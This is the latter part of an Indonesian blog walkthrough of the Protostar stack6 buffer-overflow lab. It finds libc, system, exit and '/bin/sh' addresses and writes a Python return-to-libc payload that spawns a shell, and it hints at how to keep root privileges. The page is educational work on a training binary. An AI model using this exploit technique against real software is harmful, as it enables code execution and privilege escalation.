+    style="padding-bottom: 78.99999999999999%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAIAAACZeshMAAAACXBIWXMAAAsSAAALEgHS3X78AAACKElEQVQoz22TiW7aQBCG/SxR00bcNr5vvDaHAUVqVQVFJWk4Sk5yQGkfv5+9gJqq0m9rdmb/uVcRg9yNO6YfAN3xTD8sERieL/92GFtBqFpOTdPrbaOhmxJ13VScKJZkBDuMvE5ieAEagAwNIGDCke5678h+IkzfD0QKkHHRMm3QNCzV4o9cCESW+nfkZJD7nQTfZZIBZq5qlgOOSSLscWAeyP0BTP7ZcJTlw3SQB4nw4uTvDP+Lghx3e5CjtOt1RJhmcDQbuLTn39vH+AcofJRnla2CSc0Apew5VdCqom1+iEcqPwKTIntQBM8yLhE8EAKbG9PhGL9tx9VdH40TxnIKhRAxoFDBH3Fw0XY8Ui28mvZppd4ynbpmnHyqfKjUP9aaJ2e1YyEIOKW7pG2S7fN2s/m9e/21fd1t33Y/nzYvz9s3eSyxAQ8v69Xjw936EeH7ctEwrKJmEuOwvL+9Xi5mqx/z29WXyQTN1Xx2vZjfrZ8m0+nni4tvsxus09nN1WL+9fKySc2kQQ6yZop0OyyWOGuoctXYEIqsacZptUFpuudrtkML2AKIiiyY8fbG46Q3YNXTfIg7hFBkVbUt2yEXRi055ZzMluUUZFRsSP/8XOQ5e9IdjdB0x2NykTMjFE0iL/mKEIiMUpEuxT5yv8ueDYdEE+Wq8Rhwx72qqjtRh41i/6mINrUdX8GQFv54QJHpBeUDjCDzx1QUZVgc97sURIwWgSPWP8XA6FVaw3cPAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="libc yang digunakan oleh stack6"
+        title="libc yang digunakan oleh stack6"
+        src="/static/16c5c1f5157a799d4733d5c160ae8556/c5bb3/protostar-stack6-12.png"
+        srcset="/static/16c5c1f5157a799d4733d5c160ae8556/772e8/protostar-stack6-12.png 200w,
+/static/16c5c1f5157a799d4733d5c160ae8556/e17e5/protostar-stack6-12.png 400w,
+/static/16c5c1f5157a799d4733d5c160ae8556/c5bb3/protostar-stack6-12.png 680w"
+        sizes="(max-width: 680px) 100vw, 680px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+      />
+  </a>
+    </span></p>
+<p>libc yang digunakan oleh stack6 ialah yang saya highlight pada screenshot diatas, <em>/lib/libc-2.11.2.so</em> dan diload pada address 0xb7e97000. Sekarang pindah pada sesi ssh lain dan gunakan perintah berikut untuk mencari lokasi string '/bin/sh'.</p>
+<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">strings -t x -a /lib/libc-2.11.2.so <span class="token operator">|</span> <span class="token function">grep</span> /bin/sh</code></pre></div>
+<p>Gunakanlah <code class="language-text">man strings</code> untuk mengetahui fungsi dari argumen yang saya gunakan.</p>
+<p>output:
+<span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 656px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/f3687aa1337937b1d4eb1d9ed1b4329a/748f4/protostar-stack6-13.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 10.999999999999998%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAIAAADXZGvcAAAACXBIWXMAAAsSAAALEgHS3X78AAAAX0lEQVQI1z2LCwqAIBBEO08klH93dV1LhKD7n6cNIXgMw2Nm4TGoj1RbpDoJ5UsLGIkdFh3BYU7EIqX4TCI9lvN+llS5XB34O8tOOELSAaC23Udl3GTT9u/K+HXXeI0XpkMa8Ti3t4QAAAAASUVORK5CYII='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="lokasi string /bin/sh pada libc"
+        title="lokasi string /bin/sh pada libc"
+        src="/static/f3687aa1337937b1d4eb1d9ed1b4329a/748f4/protostar-stack6-13.png"
+        srcset="/static/f3687aa1337937b1d4eb1d9ed1b4329a/772e8/protostar-stack6-13.png 200w,
+/static/f3687aa1337937b1d4eb1d9ed1b4329a/e17e5/protostar-stack6-13.png 400w,
+/static/f3687aa1337937b1d4eb1d9ed1b4329a/748f4/protostar-stack6-13.png 656w"
+        sizes="(max-width: 656px) 100vw, 656px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+      />
+  </a>
+    </span></p>
+<ul>
+<li>system : 0xb7ecffb0</li>
+<li>exit : 0xb7ec60c0</li>
+<li>'/bin/sh' : 0x0011f3bf + 0xb7e97000 (strings mencari pada libc yang dimulai dari address 0x0, sehingga perlu ditambahkan dengan 0xb7e97000, address libc mulai di load pada stack6)</li>
+</ul>
+<p>Dengan ketiga informasi address diatas, beserta offset yang kita cari diawal, kita sudah dapat membuat payload. Disini saya menggunakan bantuan python dengan module struct agar tidak perlu menerjemahkan address ke little endian secara manual. Buatlah script python baru pada directory /tmp/ , saya menggunakan text editor nano dan menyimpannya dengan nama payload.py.</p>
+<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token function">nano</span> /tmp/payload.py</code></pre></div>
+<p>Berikut kode payloadnya.</p>
+<div class="gatsby-highlight" data-language="python"><pre class="language-python"><code class="language-python"><span class="token keyword">import</span> struct
+
+offset<span class="token operator">=</span><span class="token number">80</span><span class="token operator">*</span><span class="token string">"A"</span> <span class="token comment">#padding</span>
+system<span class="token operator">=</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"&lt;I"</span><span class="token punctuation">,</span> <span class="token number">0xb7ecffb0</span><span class="token punctuation">)</span> <span class="token comment">#(eip)return ke system</span>
+exit<span class="token operator">=</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"&lt;I"</span><span class="token punctuation">,</span> <span class="token number">0xb7ec60c0</span><span class="token punctuation">)</span> <span class="token comment">#return address setelah system dieksekusi</span>
+args<span class="token operator">=</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"&lt;I"</span><span class="token punctuation">,</span> <span class="token number">0xb7e97000</span> <span class="token operator">+</span> <span class="token number">0x11f3bf</span><span class="token punctuation">)</span> <span class="token comment">#argumen untuk system</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>offset<span class="token operator">+</span>system<span class="token operator">+</span>exit<span class="token operator">+</span>args<span class="token punctuation">)</span></code></pre></div>
+<p>struct.pack digunakan untuk mengubah alamat hexadesimal menjadi dalam format lain, dalam hal ini dalam little endian (&#x3C;I). Simpan dengan ctrl+x.</p>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 654px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/fb3870af78cd36e79e1231f1986fb015/68e9c/protostar-stack6-14.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 75%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAAAsSAAALEgHS3X78AAAChUlEQVQ4y5WTWU/bUBCF/S9aSqUKAkns2HHiJU4cmyxOyEJbVIKoaPY9LO0bEgKBoAEKtFWl9qE/93TuhVAaeCgPn2bu8czxJJ4rzAZkzAYUvGTRz3IZM4sS5mQNStyFbLkIaHGIRgKSaUMkXkkqnvmCmFmQ8Nwn4oU/xOsXIyaEzXYHH7o9TpVojbZQHwx53Ox0Ue31sVatoVKrczaaLbxvtf+B640miu/WIdRGQ9R6HbQHfbQp7+5sob+zjd7WCK1+D81eF7V2C41OG81uBwN6PtzdxpBqBgzKG6Q3yaNOLxd8cfoZhoWwaUAMyQgtivAHZcyLMnwMSYFPUeGTGWHM03mOYHFBkjl+pgclmE4aglcowCuUYOdSyLoOygkTCVtHIp1FMpOF7S7BDUeQUqNYimhwojrSFG3NgBKLQyUihEJnJ1eAkMrl4WQ9OJkcUoUiop6BWDqJzHIR2VIJbtJBwTCRj1kohhSUaKIVokC5RcY6MzZiCEU1JLN5CKqXR5wmccmUYadTsFNpuF4OZtKlCSxodhKRhA2DmuNkYmg6TJrUij5iKOsxKLqJMIlhmkRl/yfPb3QOa9JMyKyRkKcI3zcMM7NJ4xQT4ztuax9w31CZbpriUeNH+DvhfxQ/yVA1rQcPn6qxKNNHSnrLEIK0YyE6SBH9NmoIKJG7XKYPMtEmNUwTaS+5Fr3RmE+CVk84uzrH/vEhDk+OsHewj+PxKS6/X2P/6IBro4+7GF+e4+fvXzyeXoxx9PkE1z++3mpnXD+/vsCnvT0Ix+MTZGih8+UVxGjv3lYqvDhXLuP1WgUW3ZSNWhVfvl2htLpKOtU5rG4ddbrfGbpp2WKJXw6v/AZ/ADXFDaWlBT7jAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="buat payload dengan nano"
+        title="buat payload dengan nano"
+        src="/static/fb3870af78cd36e79e1231f1986fb015/68e9c/protostar-stack6-14.png"
+        srcset="/static/fb3870af78cd36e79e1231f1986fb015/772e8/protostar-stack6-14.png 200w,
+/static/fb3870af78cd36e79e1231f1986fb015/e17e5/protostar-stack6-14.png 400w,
+/static/fb3870af78cd36e79e1231f1986fb015/68e9c/protostar-stack6-14.png 654w"
+        sizes="(max-width: 654px) 100vw, 654px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+      />
+  </a>
+    </span></p>
+<p>Sekarang kita keluar gdb dan jalankan stack6 dengan payload baru.</p>
+<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">python /tmp/payload.py <span class="token operator">></span> /tmp/payload
+<span class="token punctuation">(</span>cat /tmp/payload<span class="token punctuation">;</span> <span class="token function">cat</span><span class="token punctuation">)</span> <span class="token operator">|</span> ./stack6</code></pre></div>
+<p>output:
+<span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 653px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/b705c749085c6b5ebc81f1313e48923d/e7dce/protostar-stack6-15.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 19.499999999999996%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAAsSAAALEgHS3X78AAAAt0lEQVQI122OyQrCMBCG+zgK1pIuaZNmmcQkDTZCUbzYg8tRQd//5mCvwsfPwPAvGQzRhCitAz9oH8wQIQzCWg5AhWIKEK6h7DiVioNhGkjL8rJeEZppF8CHHqxyXjmnnRfW9ca2UqHKncMgNKCt5gJfnVSk5RXrC6Yyvx+x7TzPISUbY0iHy+2ajqdxmjrsBJxgFpaI32FoLx6vT4YNfky4altTpGhaXIWK96as/5JXzbog9+f7C2P+OnD7i10UAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="eksekusi stack6 dengan payload baru"
+        title="eksekusi stack6 dengan payload baru"
+        src="/static/b705c749085c6b5ebc81f1313e48923d/e7dce/protostar-stack6-15.png"
+        srcset="/static/b705c749085c6b5ebc81f1313e48923d/772e8/protostar-stack6-15.png 200w,
+/static/b705c749085c6b5ebc81f1313e48923d/e17e5/protostar-stack6-15.png 400w,
+/static/b705c749085c6b5ebc81f1313e48923d/e7dce/protostar-stack6-15.png 653w"
+        sizes="(max-width: 653px) 100vw, 653px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+      />
+  </a>
+    </span></p>
+<p>Berhasil! Kita mendapatkan shell, namun shell tersebut tidak mendapatkan akses root karena fungsi system mendrop privileges dari root. Gunakanlah fungsi lain yang sifatnya tidak mendrop privileges jika ingin mendapatkan akses root.</p></div></div><footer style="margin-top:5rem;text-align:center"><p>By <a href="http://rochimfn.github.io/contact/">Rochim</a></p><a href="mailto:rochim.noviyan@gmail.com"><svg aria-hidden="true" focusable="false" data-prefix="far" data-icon="envelope" class="svg-inline--fa fa-envelope fa-w-16 fa-2x " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" style="color:;margin-right:10px"><path fill="currentColor" d="M464 64H48C21.49 64 0 85.49 0 112v288c0 26.51 21.49 48 48 48h416c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm0 48v40.805c-22.422 18.259-58.168 46.651-134.587 106.49-16.841 13.247-50.201 45.072-73.413 44.701-23.208.375-56.579-31.459-73.413-44.701C106.18 199.465 70.425 171.067 48 152.805V112h416zM48 400V214.398c22.914 18.251 55.409 43.862 104.938 82.646 21.857 17.205 60.134 55.186 103.062 54.955 42.717.231 80.509-37.199 103.053-54.947 49.528-38.783 82.032-64.401 104.947-82.653V400H48z"></path></svg></a><a href="https://t.me/rochimfn"><svg aria-hidden="true" focusable="false" data-prefix="fab" data-icon="telegram" class="svg-inline--fa fa-telegram fa-w-16 fa-2x " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" style="color:#0088cc;margin-right:10px"><path fill="currentColor" d="M248 8C111 8 0 119 0 256s111 248 248 248 248-111 248-248S385 8 248 8zm121.8 169.9l-40.7 191.8c-3 13.6-11.1 16.9-22.4 10.5l-62-45.7-29.9 28.8c-3.3 3.3-6.1 6.1-12.5 6.1l4.4-63.1 114.9-103.8c5-4.4-1.1-6.9-7.7-2.5l-142 89.4-61.2-19.1c-13.3-4.2-13.6-13.3 2.8-19.7l239.1-92.2c11.1-4 20.8 2.7 17.2 19.5z"></path></svg></a><a href="https://github.com/rochimfn"><svg aria-hidden="true" focusable="false" data-prefix="fab" data-icon="github" class="svg-inline--fa fa-github fa-w-16 fa-2x " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" style="color:#24292e;margin-right:10px"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"></path></svg></a><a href="https://www.linkedin.com/in/rochim-farul-noviyan-421292164"><svg aria-hidden="true" focusable="false" data-prefix="fab" data-icon="linkedin" class="svg-inline--fa fa-linkedin fa-w-14 fa-2x " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" style="color:#0e76a8;margin-right:10px"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"></path></svg></a><a href="https://twitter.com/rochimfn"><svg aria-hidden="true" focusable="false" data-prefix="fab" data-icon="twitter" class="svg-inline--fa fa-twitter fa-w-16 fa-2x " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" style="color:#1DA1F2;margin-right:10px"><path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"></path></svg></a><a href="https://instagram.com/rochim.noviyan"><svg aria-hidden="true" focusable="false" data-prefix="fab" data-icon="instagram" class="svg-inline--fa fa-instagram fa-w-14 fa-2x " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" style="color:#C13584;margin-right:10px"><path fill="currentColor" d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z"></path></svg></a><a href="https://www.facebook.com/rochim.farulnoviyan"><svg aria-hidden="true" focusable="false" data-prefix="fab" data-icon="facebook" class="svg-inline--fa fa-facebook fa-w-16 fa-2x " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" style="color:#4267B2;margin-right:10px"><path fill="currentColor" d="M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.28c-30.8 0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z"></path></svg></a></footer></div></div><div id="gatsby-announcer" style="position:absolute;top:0;width:1px;height:1px;padding:0;overflow:hidden;clip:rect(0, 0, 0, 0);white-space:nowrap;border:0" aria-live="assertive" aria-atomic="true"></div></div><script id="gatsby-script-loader">/*<![CDATA[*/window.pagePath="/belajar-reversing-protostar-stack6/";/*]]>*/</script><script id="gatsby-chunk-mapping">/*<![CDATA[*/window.___chunkMapping={"app":["/app-fc0792eb657b24edfecf.js"],"component---src-pages-about-js":["/component---src-pages-about-js-4ff5669701838a73c39b.js"],"component---src-pages-blog-js":["/component---src-pages-blog-js-1ada6ead1510deb1c65a.js"],"component---src-pages-contact-js":["/component---src-pages-contact-js-bf91673d3ab0f16a69a9.js"],"component---src-pages-index-js":["/component---src-pages-index-js-4aebeffff6c1fe562c2a.js"],"component---src-templates-blog-post-js":["/component---src-templates-blog-post-js-0314926304c56436cd57.js"]};/*]]>*/</script><script src="/component---src-templates-blog-post-js-0314926304c56436cd57.js" async=""></script><script src="/commons-0d874dae4b82f1c3f7da.js" async=""></script><script src="/a9a7754c-a89164b92346a482070c.js" async=""></script><script src="/app-fc0792eb657b24edfecf.js" async=""></script><script src="/styles-fa79fef4936efa84b233.js" async=""></script><script src="/framework-8dcecaaefd71e2213eb2.js" async=""></script><script src="/webpack-runtime-64b4c2d3318702dd0a66.js" async=""></script></body></html>
